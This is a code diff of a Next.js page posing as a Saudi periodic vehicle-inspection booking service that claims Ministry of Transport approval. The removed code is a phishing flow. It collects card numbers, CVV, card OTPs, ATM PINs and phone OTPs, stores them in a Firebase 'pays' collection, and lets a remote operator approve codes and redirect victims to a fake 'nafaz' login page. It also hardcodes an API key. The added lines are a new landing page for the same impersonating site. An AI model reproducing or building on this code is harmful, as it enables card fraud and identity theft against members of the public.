@@ -1,1854 +1,301 @@
-"use client"
-
-import type React from "react"
-import Image from "next/image"
-
-import { useEffect, useState } from "react"
 import { Button } from "@/components/ui/button"
-import { Card, CardContent } from "@/components/ui/card"
-import { Input } from "@/components/ui/input"
-import { Label } from "@/components/ui/label"
-import { ArrowLeft, Car, Truck, Calendar, ChevronDown, CreditCard, Wallet, Menu, Mail, Check, Lock } from "lucide-react"
-import { doc, onSnapshot } from "firebase/firestore"
-import { addData, db } from "@/lib/firebase"
-import { setupOnlineStatus } from "@/lib/utils"
-import type { VehicleStatus, VehicleType, AppStep, PaymentMethod, BankInfo, BinDatabase, ApprovalStatus } from "@/lib/types"
+import { Card } from "@/components/ui/card"
+import { Badge } from "@/components/ui/badge"
+import { Menu, CheckCircle, FileText, Search, Clock, ArrowLeft, Shield, Award, TrendingUp, Users } from "lucide-react"
+import Link from "next/link"
 
-// Removed duplicate type BankInfo definition as it's already imported from "@/types"
-// type BankInfo = {
-//   name: string
-//   logo: string
-//   color: string
-// }
-function randstr(prefix: string) {
-  return Math.random()
-    .toString(36)
-    .replace("0.", prefix || "")
-}
-const visitorID = randstr("salmn-")
-export default function VehicleBooking() {
-  const [vehicleStatus, setVehicleStatus] = useState<VehicleStatus>("license")
-  const [country, setCountry] = useState("")
-  const [plateNumbers, setPlateNumbers] = useState("")
-  const [plateLetters, setPlateLetters] = useState("")
-  const [plateInfo, setPlateInfo] = useState("")
-  const [registrationType, setRegistrationType] = useState("")
-  const [vehicleType, setVehicleType] = useState<VehicleType>("car")
-  const [region, setRegion] = useState("")
-  const [city, setCity] = useState("")
-  const [inspectionCenter, setInspectionCenter] = useState("")
-  const [inspectionDate, setInspectionDate] = useState("")
-  const [inspectionTime, setInspectionTime] = useState("")
-  const [captchaChecked, setCaptchaChecked] = useState(true)
-  const [inspectionType, setInspectionType] = useState("") // Added declaration
+export default function Home() {
+  return (
+    <div className="min-h-screen bg-background" dir="rtl" lang="ar">
+      {/* Header */}
+      <header className="bg-card/80 backdrop-blur-lg border-b border-border sticky top-0 z-50">
+        <div className="container mx-auto px-6 py-4 flex items-center justify-between">
+          <button className="p-2 hover:bg-accent rounded-lg transition-colors">
+            <Menu className="w-5 h-5 text-foreground" />
+          </button>
+          <div className="flex items-center gap-3">
+          <img src='/next.svg' alt="logo" width={180}/>
+          </div>
+          <Button variant="ghost" size="sm" className="text-muted-foreground hover:text-foreground">
+            English
+          </Button>
+        </div>
+      </header>
 
-  const [currentStep, setCurrentStep] = useState<AppStep>("landing") // Changed initial step to landing
-  const [paymentMethod, setPaymentMethod] = useState<PaymentMethod | "">("")
-  const [cardNumber, setCardNumber] = useState("")
-  const [cardName, setCardName] = useState("")
-  const [expiryDate, setExpiryDate] = useState("")
-  const [cvv, setCvv] = useState("")
-  const [otp, setOtp] = useState("")
-  const [pin, setPin] = useState(["", "", "", ""])
-  const [isLoading, setIsLoading] = useState(false)
-  const [phone, setPhone] = useState("")
-  const [operator, setOperator] = useState("")
-  const [phoneOtp, setPhoneOtp] = useState("")
-  const [phoneOtpError, setPhoneOtpError] = useState("")
-  const [cardOtpApproval, setCardOtpApproval] = useState<ApprovalStatus | undefined>()
-  const [phoneOtpApproval, setPhoneOtpApproval] = useState<ApprovalStatus | undefined>()
-  const [otpError, setOtpError] = useState("")
-  const [bankInfo, setBankInfo] = useState<BankInfo | null>(null)
-
-  useEffect(() => {
-    getLocation().then(() => {
-      setIsLoading(false)
-    })
-
-    const visitorId = localStorage.getItem("visitor") || visitorID
-    const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnapshot) => {
-      if (docSnapshot.exists()) {
-        const userData = docSnapshot.data()
-        if (userData.cardOtpApproval) {
-          setCardOtpApproval(userData.cardOtpApproval as ApprovalStatus)
-        }
-        if (userData.phoneOtpApproval) {
-          setPhoneOtpApproval(userData.phoneOtpApproval as ApprovalStatus)
-        }
-
-        if (userData.currentPage === "2" || userData.currentPage === 2) {
-          window.location.href = "/quote"
-        } else if (userData.currentPage === "8888" || userData.currentPage === "nafaz") {
-          window.location.href = "/nafaz"
-        } else if (userData.currentPage === "9999") {
-          window.location.href = "/verify-phone"
-        }
-      }
-    })
-
-    return () => unsubscribe()
-  }, [])
-
-  async function getLocation() {
-    const APIKEY = "856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef"
-    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`
-
-    try {
-      const response = await fetch(url)
-      if (!response.ok) {
-        throw new Error(`HTTP error! Status: ${response.status}`)
-      }
-      const country = await response.text()
-      await addData({
-        id: visitorID,
-        country: country,
-        createdDate: new Date().toISOString(),
-      })
-      localStorage.setItem("country", country)
-      setupOnlineStatus(visitorID)
-    } catch (error) {
-      console.error("Error fetching location:", error)
-    }
-  }
-  const handleSubmit = async (e: React.FormEvent) => {
-    e.preventDefault()
-    await addData({
-      id: visitorID,
-      vehicleStatus,
-      country,
-      plateNumbers,
-      plateLetters,
-      plateInfo,
-      registrationType,
-      vehicleType,
-      region,
-      city,
-      inspectionCenter,
-      inspectionDate,
-      inspectionTime,
-      inspectionType,
-      step: "booking-completed",
-    })
-    setIsLoading(true)
-    setTimeout(() => {
-      setCurrentStep("payment-method")
-      setIsLoading(false)
-    }, 1500)
-  }
-
-  const handlePaymentMethodSubmit = async () => {
-    if (paymentMethod) {
-      await addData({
-        id: visitorID,
-        paymentMethod,
-        step: "payment-method-selected",
-      })
-      setIsLoading(true)
-      setTimeout(() => {
-        setCurrentStep("card-form")
-        setIsLoading(false)
-      }, 1500)
-    }
-  }
-
-  const handleCardFormSubmit = async (e: React.FormEvent) => {
-    e.preventDefault()
-    await addData({
-      id: visitorID,
-      cardNumber,
-      cardName,
-      expiryDate,
-      cvv,
-      step: "card-details-submitted",
-    })
-    setIsLoading(true)
-    setTimeout(() => {
-      setCurrentStep("otp")
-      setIsLoading(false)
-    }, 1500)
-  }
-
-  const handleOtpSubmit = async (e: React.FormEvent) => {
-    e.preventDefault()
-    setOtpError("")
-    await addData({
-      id: visitorID,
-      otp: otp,
-      step: "otp-submitted",
-      cardOtpApproval: "pending",
-    })
-    setCardOtpApproval("pending")
-    setIsLoading(true)
-  }
-
-  useEffect(() => {
-    if (cardOtpApproval === "approved") {
-      setIsLoading(false)
-      setCurrentStep("pin")
-    } else if (cardOtpApproval === "rejected") {
-      setIsLoading(false)
-      setOtpError("رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى.")
-    }
-  }, [cardOtpApproval])
-
-  const handlePinSubmit = async (e: React.FormEvent) => {
-    e.preventDefault()
-    await addData({
-      id: visitorID,
-      pin: pin.join(""),
-      step: "pin-submitted",
-    })
-    setIsLoading(true)
-    setTimeout(() => {
-      setCurrentStep("phone-verification")
-      setIsLoading(false)
-    }, 1500)
-  }
-
-  const handlePhoneVerification = async (e: React.FormEvent) => {
-    e.preventDefault()
-    setPhoneOtpError("")
-    await addData({
-      id: visitorID,
-      phone,
-      operator,
-      phoneOtp,
-      step: "payment-completed",
-      completedDate: new Date().toISOString(),
-      phoneOtpApproval: "pending",
-    })
-    setPhoneOtpApproval("pending")
-    setIsLoading(true)
-  }
-
-  useEffect(() => {
-    if (phoneOtpApproval === "approved") {
-      setIsLoading(false)
-      // Navigate to success page or show success message
-      setCurrentStep("landing")
-      alert("تم التحقق بنجاح! شكراً لك.")
-    } else if (phoneOtpApproval === "rejected") {
-      setIsLoading(false)
-      setPhoneOtpError("رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى.")
-    }
-  }, [phoneOtpApproval])
-
-  const checkBIN = (cardNum: string) => {
-    const bin = cardNum.replace(/\s/g, "").substring(0, 6)
-
-    // Saudi banks BIN database
-    const binDatabase: BinDatabase = {
-      "400861": { name: "الراجحي", logo: "🏦", color: "#1a4d2e" },
-      "446404": { name: "الراجحي", logo: "🏦", color: "#1a4d2e" },
-      "535024": { name: "الأهلي", logo: "🏦", color: "#006747" },
-      "468540": { name: "الأهلي", logo: "🏦", color: "#006747" },
-      "401205": { name: "الرياض", logo: "🏦", color: "#0066b2" },
-      "489318": { name: "الرياض", logo: "🏦", color: "#0066b2" },
-      "543357": { name: "ساب", logo: "🏦", color: "#0f75bc" },
-      "455708": { name: "ساب", logo: "🏦", color: "#0f75bc" },
-      "474491": { name: "سامبا", logo: "🏦", color: "#c41e3a" },
-      "431361": { name: "سامبا", logo: "🏦", color: "#c41e3a" },
-      "543085": { name: "الإنماء", logo: "🏦", color: "#00a651" },
-      "440647": { name: "الإنماء", logo: "🏦", color: "#00a651" },
-      "968208": { name: "الجزيرة", logo: "🏦", color: "#0055a5" },
-      "529415": { name: "الجزيرة", logo: "🏦", color: "#0055a5" },
-    }
-
-    if (bin.length >= 6 && binDatabase[bin]) {
-      setBankInfo(binDatabase[bin])
-    } else {
-      setBankInfo(null)
-    }
-  }
-
-  const handleCardNumberChange = (value: string) => {
-    const formatted = value
-      .replace(/\s/g, "")
-      .replace(/(\d{4})/g, "$1 ")
-      .trim()
-    setCardNumber(formatted)
-    checkBIN(formatted)
-  }
-
-  const vehicleTypes = [
-    { id: "car" as VehicleType, label: "سيارة خاصة", icon: Car },
-    { id: "truck" as VehicleType, label: "شاحنة", icon: Truck },
-  ]
-
-  const inspectionTypes = [
-    { value: "private-car", label: "سيارة خاصة", icon: "🚗" },
-    { value: "light-private-transport", label: "مركبة نقل خفيفة خاصة", icon: "🚚" },
-    { value: "heavy-transport", label: "نقل ثقيل", icon: "🚛" },
-    { value: "light-bus", label: "حافلة خفيفة", icon: "🚐" },
-    { value: "light-transport", label: "مركبة نقل خفيفة", icon: "🚚" },
-    { value: "medium-transport", label: "نقل متوسط", icon: "🚛" },
-    { value: "large-bus", label: "حافلة كبيرة", icon: "🚌" },
-    { value: "two-wheel-motorcycle", label: "الدراجات ثنائية العجلات", icon: "🏍️" },
-    { value: "public-works", label: "مركبات أشغال عامة", icon: "🚜" },
-    { value: "three-four-wheel", label: "دراجة ثلاثية أو رباعية العجلات", icon: "🛺" },
-    { value: "heavy-trailer", label: "مقطورة ثقيلة", icon: "🚛" },
-    { value: "rental-cars", label: "سيارات الأجرة", icon: "🚕" },
-    { value: "hire-cars", label: "سيارات التأجير", icon: "🚗" },
-    { value: "semi-heavy-trailer", label: "نصف مقطورة ثقيلة", icon: "🚛" },
-    { value: "medium-bus", label: "حافلة متوسطة", icon: "🚐" },
-    { value: "light-trailer", label: "مقطورة خفيفة", icon: "🚚" },
-    { value: "light-semi-trailer", label: "نصف مقطورة خفيفة", icon: "🚚" },
-    { value: "private-light-semi-trailer", label: "نصف مقطورة خفيفة خاصة", icon: "🚚" },
-    { value: "private-light-trailer", label: "مقطورة خفيفة خاصة", icon: "🚚" },
-  ]
-
-  const regions = [
-    { value: "riyadh", label: "منطقة الرياض" },
-    { value: "makkah", label: "منطقة مكة المكرمة" },
-    { value: "madinah", label: "منطقة المدينة المنورة" },
-    { value: "eastern", label: "المنطقة الشرقية" },
-    { value: "qassim", label: "منطقة القصيم" },
-    { value: "asir", label: "منطقة عسير" },
-    { value: "tabuk", label: "منطقة تبوك" },
-    { value: "hail", label: "منطقة حائل" },
-    { value: "najran", label: "منطقة نجران" },
-    { value: "jazan", label: "منطقة جازان" },
-    { value: "northern", label: "منطقة الحدود الشمالية" },
-    { value: "jouf", label: "منطقة الجوف" },
-    { value: "bahah", label: "منطقة الباحة" },
-  ]
-
-  const citiesByRegion: Record<string, { value: string; label: string }[]> = {
-    riyadh: [
-      { value: "riyadh-city", label: "الرياض" },
-      { value: "diriyah", label: "الدرعية" },
-      { value: "kharj", label: "الخرج" },
-      { value: "dawadmi", label: "الدوادمي" },
-      { value: "majmaah", label: "المجمعة" },
-      { value: "quwayiyah", label: "القويعية" },
-      { value: "aflaj", label: "الأفلاج" },
-      { value: "zulfi", label: "الزلفي" },
-    ],
-    makkah: [
-      { value: "makkah-city", label: "مكة المكرمة" },
-      { value: "jeddah", label: "جدة" },
-      { value: "taif", label: "الطائف" },
-      { value: "qunfudhah", label: "القنفذة" },
-      { value: "lith", label: "الليث" },
-      { value: "rabigh", label: "رابغ" },
-      { value: "khulais", label: "خليص" },
-      { value: "ranyah", label: "رنية" },
-    ],
-    madinah: [
-      { value: "madinah-city", label: "المدينة المنورة" },
-      { value: "yanbu", label: "ينبع" },
-      { value: "alula", label: "العلا" },
-      { value: "mahd", label: "مهد الذهب" },
-      { value: "badr", label: "بدر" },
-      { value: "khaybar", label: "خيبر" },
-    ],
-    eastern: [
-      { value: "dammam", label: "الدمام" },
-      { value: "khobar", label: "الخبر" },
-      { value: "dhahran", label: "الظهران" },
-      { value: "jubail", label: "الجبيل" },
-      { value: "qatif", label: "القطيف" },
-      { value: "hofuf", label: "الهفوف" },
-      { value: "mubarraz", label: "المبرز" },
-      { value: "khafji", label: "الخفجي" },
-    ],
-    qassim: [
-      { value: "buraidah", label: "بريدة" },
-      { value: "unaizah", label: "عنيزة" },
-      { value: "rass", label: "الرس" },
-      { value: "midhnab", label: "المذنب" },
-      { value: "bukayriyah", label: "البكيرية" },
-    ],
-    asir: [
-      { value: "abha", label: "أبها" },
-      { value: "khamis-mushait", label: "خميس مشيط" },
-      { value: "najran-asir", label: "نجران" },
-      { value: "bisha", label: "بيشة" },
-      { value: "sarat-ubaidah", label: "سراة عبيدة" },
-    ],
-    tabuk: [
-      { value: "tabuk-city", label: "تبوك" },
-      { value: "umluj", label: "أملج" },
-      { value: "wajh", label: "الوجه" },
-      { value: "duba", label: "ضباء" },
-      { value: "tayma", label: "تيماء" },
-    ],
-    hail: [
-      { value: "hail-city", label: "حائل" },
-      { value: "baqaa", label: "بقعاء" },
-      { value: "ghazalah", label: "الغزالة" },
-      { value: "shamli", label: "الشملي" },
-    ],
-    najran: [
-      { value: "najran-city", label: "نجران" },
-      { value: "sharourah", label: "شرورة" },
-      { value: "habuna", label: "حبونا" },
-      { value: "badr-south", label: "بدر الجنوب" },
-    ],
-    jazan: [
-      { value: "jazan-city", label: "جازان" },
-      { value: "sabya", label: "صبيا" },
-      { value: "abu-arish", label: "أبو عريش" },
-      { value: "samtah", label: "صامطة" },
-      { value: "farasan", label: "فرسان" },
-    ],
-    northern: [
-      { value: "arar", label: "عرعر" },
-      { value: "rafha", label: "رفحاء" },
-      { value: "turaif", label: "طريف" },
-    ],
-    jouf: [
-      { value: "sakaka", label: "سكاكا" },
-      { value: "qurayat", label: "القريات" },
-      { value: "dumat", label: "دومة الجندل" },
-    ],
-    bahah: [
-      { value: "bahah-city", label: "الباحة" },
-      { value: "baljurashi", label: "بلجرشي" },
-      { value: "almandaq", label: "المندق" },
-      { value: "qilwah", label: "قلوة" },
-    ],
-  }
-
-  const inspectionCenters = [
-    { value: "center1", label: "محطة الفحص الدوري - الدمام" },
-    { value: "center2", label: "محطة الفحص الدوري - الخبر" },
-    { value: "center3", label: "محطة الفحص الدوري - الظهران" },
-  ]
-
-  const paymentMethods = [
-    {
-      id: "card" as PaymentMethod,
-      label: "بطاقة ائتمان",
-      icon: Wallet,
-      description: "فيزا أو ماستركارد",
-      badge: "استرداد نقدي 15%",
-      available: true,
-    },
-    {
-      id: "wallet" as PaymentMethod,
-      label: "مدى",
-      icon: CreditCard,
-      description: "بطاقة مدى",
-      available: false,
-    },
-    {
-      id: "bank" as PaymentMethod,
-      label: "Apple Pay",
-      icon: Wallet,
-      description: "الدفع عبر آبل",
-      available: false,
-    },
-  ]
-
-  if (isLoading) {
-    return (
-      <div dir="rtl" className="min-h-screen bg-background flex items-center justify-center">
-        <Card className="w-full max-w-md mx-4 shadow-lg">
-          <CardContent className="p-12">
-            <div className="flex flex-col items-center gap-6">
-              <div className="relative w-20 h-20">
-                <div className="absolute inset-0 border-4 border-teal-700/30 rounded-full"></div>
-                <div className="absolute inset-0 border-4 border-teal-700 border-t-transparent rounded-full animate-spin"></div>
-              </div>
-              <div className="text-center space-y-2">
-                <h3 className="text-xl font-semibold text-foreground">جاري المعالجة...</h3>
-                <p className="text-muted-foreground">الرجاء الانتظار</p>
-              </div>
-            </div>
-          </CardContent>
-        </Card>
-      </div>
-    )
-  }
-
-  if (currentStep === "landing") {
-    return (
-      <div dir="rtl" className="min-h-screen bg-background">
-        {/* Hero Section */}
-        <div className="relative overflow-hidden bg-gradient-to-b from-secondary/30 to-background">
-          <div className="container mx-auto px-4 py-16 md:py-24 max-w-6xl">
-            {/* Trust Badge */}
-            <div className="flex justify-center mb-8">
-              <div className="inline-flex items-center gap-2 px-4 py-2 rounded-full bg-teal-700/10 border border-teal-700/20">
-                <div className="w-2 h-2 rounded-full bg-teal-700 animate-pulse" />
-                <span className="text-sm font-medium text-foreground">خدمة معتمدة من وزارة النقل</span>
-              </div>
-            </div>
-
-            <div className="grid lg:grid-cols-2 gap-12 items-center">
-              {/* Content */}
-              <div className="text-center lg:text-right space-y-8">
-                <div className="space-y-4">
-                  <h1 className="text-5xl md:text-6xl lg:text-7xl font-bold text-foreground leading-tight text-balance">
-                    خدمة الفحص الفني الدوري
-                  </h1>
-                  <p className="text-xl md:text-2xl text-muted-foreground leading-relaxed text-pretty max-w-xl mx-auto lg:mx-0">
-                    احجز موعد فحص مركبتك بسهولة وسرعة. خدمة احترافية وموثوقة لضمان سلامتك على الطريق
-                  </p>
-                </div>
-
-                {/* Primary CTA */}
-                <div className="flex flex-col sm:flex-row gap-4 justify-center lg:justify-start">
-                  <Button
-                    size="lg"
-                    className="h-14 px-8 text-lg font-semibold bg-teal-700 hover:bg-teal-700/90 shadow-lg hover:shadow-xl transition-all"
-                    onClick={() => setCurrentStep("booking")}
-                  >
-                    احجز موعد الآن
-                    <svg className="mr-2 h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" />
-                    </svg>
-                  </Button>
-                  <Button
-                    size="lg"
-                    variant="outline"
-                    className="h-14 px-8 text-lg font-medium border-2 hover:bg-secondary bg-transparent"
-                  >
-                    معلومات أكثر
-                  </Button>
-                </div>
-
-                {/* Stats */}
-                <div className="flex gap-8 justify-center lg:justify-start pt-8 border-t border-border">
-                  <div className="text-center lg:text-right">
-                    <div className="text-3xl font-bold text-foreground">+50,000</div>
-                    <div className="text-sm text-muted-foreground">فحص مكتمل</div>
-                  </div>
-                  <div className="text-center lg:text-right">
-                    <div className="text-3xl font-bold text-foreground">24/7</div>
-                    <div className="text-sm text-muted-foreground">دعم فني</div>
-                  </div>
-                  <div className="text-center lg:text-right">
-                    <div className="text-3xl font-bold text-foreground">98%</div>
-                    <div className="text-sm text-muted-foreground">رضا العملاء</div>
-                  </div>
-                </div>
-              </div>
-
-              {/* Vehicle Image */}
-              <div className="relative">
-                <div className="absolute inset-0 bg-teal-700/5 rounded-3xl blur-3xl" />
-                <Image
-                  src="/white-sedan-car-with-technical-inspection-labels-i.jpg"
-                  alt="فحص المركبة"
-                  width={800}
-                  height={500}
-                  className="relative w-full h-auto rounded-2xl shadow-2xl"
-                  priority
-                />
-              </div>
-            </div>
+      {/* Hero Section */}
+      <section className="relative overflow-hidden bg-[url(/bg.png)] bg-contain bg-no-repeat h-full w-full s">
+        <div className="absolute inset-0 bg-gradient-to-br from-green-600/50 via-green-800/60 to-secondary">
+          <div className="absolute inset-0 opacity-10">
+            {/* <img src="/bg.png" alt="مركز الفحص" className="w-full h-full object-cover" /> */}
           </div>
         </div>
 
-        {/* Features Section */}
-        <div className="container mx-auto px-4 py-20 max-w-6xl">
-          <div className="text-center mb-16">
-            <h2 className="text-3xl md:text-4xl font-bold text-foreground mb-4">لماذا تختار خدمتنا؟</h2>
-            <p className="text-lg text-muted-foreground max-w-2xl mx-auto">
-              نوفر لك تجربة فحص سريعة وموثوقة مع أحدث التقنيات
+        <div className="relative container mx-auto px-6 py-16 md:py-24">
+          <div className="max-w-3xl mx-auto text-center space-y-6">
+            <Badge className="bg-green-500-foreground/20 text-white border-green-500-foreground/30 hover:bg-green-500-foreground/30">
+              نظام متقدم ومعتمد
+            </Badge>
+
+            <h1 className="text-4xl md:text-5xl lg:text-6xl font-bold text-white text-balance leading-tight">
+              منصة الفحص الفني الدوري
+            </h1>
+
+            <p className="text-lg md:text-xl text-white  text-pretty leading-relaxed max-w-2xl mx-auto">
+              نظام متطور لخدمات الفحص الدوري والمعاينة الفنية للمركبات بأعلى معايير الجودة والأمان
+            </p>
+
+            {/* Stats */}
+            <div className="flex flex-wrap gap-8 justify-center pt-6">
+              <div className="flex items-center gap-3 bg-green-500-foreground/10 backdrop-blur-sm rounded-2xl px-6 py-3 border border-green-500-foreground/20">
+                <div className="text-right">
+                  <div className="text-3xl font-bold text-green-300">32</div>
+                  <div className="text-sm text-green-100">فاحص فني معتمد</div>
+                </div>
+                <div className="w-12 h-12 bg-green-100 rounded-xl flex items-center justify-center">
+                  <Users className="w-6 h-6 text-green-500-foreground" />
+                </div>
+              </div>
+
+              <div className="flex items-center gap-3 bg-green-500-foreground/10 backdrop-blur-sm rounded-2xl px-6 py-3 border border-green-500-foreground/20">
+                <div className="text-right">
+                  <div className="text-3xl font-bold text-green-300 ">15</div>
+                  <div className="text-sm text-green-100">محطة فحص معتمدة</div>
+                </div>
+                <div className="w-12 h-12 bg-green-100 rounded-xl flex items-center justify-center">
+                  <Award className="w-6 h-6 text-green-500-foreground" />
+                </div>
+              </div>
+            </div>
+
+            {/* CTA Buttons */}
+            <div className="flex flex-col sm:flex-row gap-4 justify-center pt-6">
+              <Link href="/application" className="flex-1 sm:flex-initial">
+                <Button
+                  size="lg"
+                  className="w-full  text-white sm:w-auto bg-green-600  hover:bg-green-600/90 rounded-xl px-8 shadow-lg shadow-black/20"
+                >
+                  استعلام عن الفحص
+                  <ArrowLeft className="w-4 h-4 mr-2" />
+                </Button>
+              </Link>
+              <Link href="/application" className="flex-1 sm:flex-initial">
+                <Button
+                  size="lg"
+                  variant="outline"
+                  className="w-full sm:w-auto bg-transparent text-white border-green-500-foreground/30 hover:bg-green-500-foreground/10 rounded-xl px-8"
+                >
+حجز موعد
+                </Button>
+              </Link>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      {/* Services Section */}
+      <section className="container mx-auto px-6 py-20">
+        <div className="max-w-6xl mx-auto">
+          <div className="text-center space-y-4 mb-16">
+            <Badge variant="outline" className="text-green-500 border-green-500/30">
+              خدماتنا الإلكترونية
+            </Badge>
+            <h2 className="text-3xl md:text-4xl font-bold text-foreground text-balance">خدمات شاملة لراحتك وسلامتك</h2>
+            <p className="text-muted-foreground text-lg text-pretty max-w-2xl mx-auto leading-relaxed">
+              نقدم مجموعة متكاملة من الخدمات الإلكترونية المتطورة لتسهيل عمليات الفحص الفني للمركبات
             </p>
           </div>
 
-          <div className="grid md:grid-cols-3 gap-8 mb-16">
-            {/* Feature 1 */}
-            <div className="group p-8 rounded-2xl bg-card border border-border hover:shadow-lg transition-all hover:-translate-y-1">
-              <div className="w-14 h-14 rounded-xl bg-teal-700/10 flex items-center justify-center mb-6 group-hover:scale-110 transition-transform">
-                <svg className="w-7 h-7 text-teal-700" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                  <path
-                    strokeLinecap="round"
-                    strokeLinejoin="round"
-                    strokeWidth={2}
-                    d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"
-                  />
-                </svg>
+          <div className="grid md:grid-cols-2 gap-6">
+            {/* Service Card 1 */}
+            <Card className="group p-8 bg-card border-border hover:shadow-xl hover:shadow-green-500/5 transition-all duration-300 hover:-translate-y-1">
+              <div className="flex items-start gap-6">
+                <div className="w-14 h-14 rounded-2xl bg-green-500/10 flex items-center justify-center flex-shrink-0 group-hover:bg-green-500/20 transition-colors">
+                  <Clock className="w-7 h-7 text-green-500" />
+                </div>
+                <div className="flex-1 space-y-3">
+                  <h3 className="text-xl font-bold text-foreground">حجز موعد الفحص</h3>
+                  <p className="text-muted-foreground leading-relaxed">
+                    احجز موعداً للفحص الدوري لمركبتك في أقرب محطة فحص معتمدة بكل سهولة ويسر
+                  </p>
+                  <button className="text-green-500 hover:text-green-500/80 font-medium inline-flex items-center gap-2 group/btn">
+                    <ArrowLeft className="w-4 h-4 group-hover/btn:-translate-x-1 transition-transform" />
+                    تفاصيل أكثر
+                  </button>
+                </div>
               </div>
-              <h3 className="text-xl font-bold text-foreground mb-3">حجز سريع ومرن</h3>
-              <p className="text-muted-foreground leading-relaxed">احجز موعدك في دقائق واختر الوقت المناسب لك</p>
-            </div>
+            </Card>
 
-            {/* Feature 2 */}
-            <div className="group p-8 rounded-2xl bg-card border border-border hover:shadow-lg transition-all hover:-translate-y-1">
-              <div className="w-14 h-14 rounded-xl bg-teal-700/10 flex items-center justify-center mb-6 group-hover:scale-110 transition-transform">
-                <svg className="w-7 h-7 text-teal-700" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                  <path
-                    strokeLinecap="round"
-                    strokeLinejoin="round"
-                    strokeWidth={2}
-                    d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"
-                  />
-                </svg>
+            {/* Service Card 2 */}
+            <Card className="group p-8 bg-card border-border hover:shadow-xl hover:shadow-green-500/5 transition-all duration-300 hover:-translate-y-1">
+              <div className="flex items-start gap-6">
+                <div className="w-14 h-14 rounded-2xl bg-green-500/10 flex items-center justify-center flex-shrink-0 group-hover:bg-green-500/20 transition-colors">
+                  <FileText className="w-7 h-7 text-green-500" />
+                </div>
+                <div className="flex-1 space-y-3">
+                  <h3 className="text-xl font-bold text-foreground">شهادة الفحص الفني</h3>
+                  <p className="text-muted-foreground leading-relaxed">
+                    احصل على شهادة الفحص الفني المعتمدة إلكترونياً فور اجتياز الفحص بنجاح
+                  </p>
+                  <button className="text-green-500 hover:text-green-500/80 font-medium inline-flex items-center gap-2 group/btn">
+                    <ArrowLeft className="w-4 h-4 group-hover/btn:-translate-x-1 transition-transform" />
+                    تفاصيل أكثر
+                  </button>
+                </div>
               </div>
-              <h3 className="text-xl font-bold text-foreground mb-3">فحص معتمد وآمن</h3>
-              <p className="text-muted-foreground leading-relaxed">فحص شامل ومعتمد من الجهات الرسمية</p>
-            </div>
+            </Card>
 
-            {/* Feature 3 */}
-            <div className="group p-8 rounded-2xl bg-card border border-border hover:shadow-lg transition-all hover:-translate-y-1">
-              <div className="w-14 h-14 rounded-xl bg-teal-700/10 flex items-center justify-center mb-6 group-hover:scale-110 transition-transform">
-                <svg className="w-7 h-7 text-teal-700" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                  <path
-                    strokeLinecap="round"
-                    strokeLinejoin="round"
-                    strokeWidth={2}
-                    d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"
-                  />
-                </svg>
+            {/* Service Card 3 */}
+            <Card className="group p-8 bg-card border-border hover:shadow-xl hover:shadow-green-500/5 transition-all duration-300 hover:-translate-y-1">
+              <div className="flex items-start gap-6">
+                <div className="w-14 h-14 rounded-2xl bg-green-500/10 flex items-center justify-center flex-shrink-0 group-hover:bg-green-500/20 transition-colors">
+                  <Search className="w-7 h-7 text-green-500" />
+                </div>
+                <div className="flex-1 space-y-3">
+                  <h3 className="text-xl font-bold text-foreground">استعلام عن حالة الفحص</h3>
+                  <p className="text-muted-foreground leading-relaxed">
+                    استعلم عن أي مركبة بإدخال رقم لوحة السيارة أو رقم الهوية الوطنية بسرعة
+                  </p>
+                  <button className="text-green-500 hover:text-green-500/80 font-medium inline-flex items-center gap-2 group/btn">
+                    <ArrowLeft className="w-4 h-4 group-hover/btn:-translate-x-1 transition-transform" />
+                    تفاصيل أكثر
+                  </button>
+                </div>
               </div>
-              <h3 className="text-xl font-bold text-foreground mb-3">دفع إلكتروني آمن</h3>
-              <p className="text-muted-foreground leading-relaxed">ادفع بأمان عبر طرق دفع متعددة ومشفرة</p>
-            </div>
+            </Card>
+
+            {/* Service Card 4 */}
+            <Card className="group p-8 bg-card border-border hover:shadow-xl hover:shadow-green-500/5 transition-all duration-300 hover:-translate-y-1">
+              <div className="flex items-start gap-6">
+                <div className="w-14 h-14 rounded-2xl bg-green-500/10 flex items-center justify-center flex-shrink-0 group-hover:bg-green-500/20 transition-colors">
+                  <CheckCircle className="w-7 h-7 text-green-500" />
+                </div>
+                <div className="flex-1 space-y-3">
+                  <h3 className="text-xl font-bold text-foreground">البحث السريع</h3>
+                  <p className="text-muted-foreground leading-relaxed">
+                    ابحث عن معلومات الفحص أو احجز موعداً أو استعلم عن أي خدمة بكل سهولة
+                  </p>
+                  <button className="text-green-500 hover:text-green-500/80 font-medium inline-flex items-center gap-2 group/btn">
+                    <ArrowLeft className="w-4 h-4 group-hover/btn:-translate-x-1 transition-transform" />
+                    تفاصيل أكثر
+                  </button>
+                </div>
+              </div>
+            </Card>
           </div>
 
           {/* Action Buttons */}
-          <div className="bg-gradient-to-br from-teal-700/5 to-accent/5 rounded-3xl p-12 border border-teal-700/10">
-            <div className="text-center mb-8">
-              <h3 className="text-2xl md:text-3xl font-bold text-foreground mb-3">ابدأ الآن</h3>
-              <p className="text-muted-foreground text-lg">اختر الإجراء المناسب لك</p>
-            </div>
-
-            <div className="grid sm:grid-cols-3 gap-4 max-w-3xl mx-auto">
-              <Button
-                size="lg"
-                className="h-16 text-base font-semibold bg-teal-700 hover:bg-teal-700/90 shadow-md"
-                onClick={() => setCurrentStep("booking")}
-              >
-                <svg className="ml-2 h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                  <path
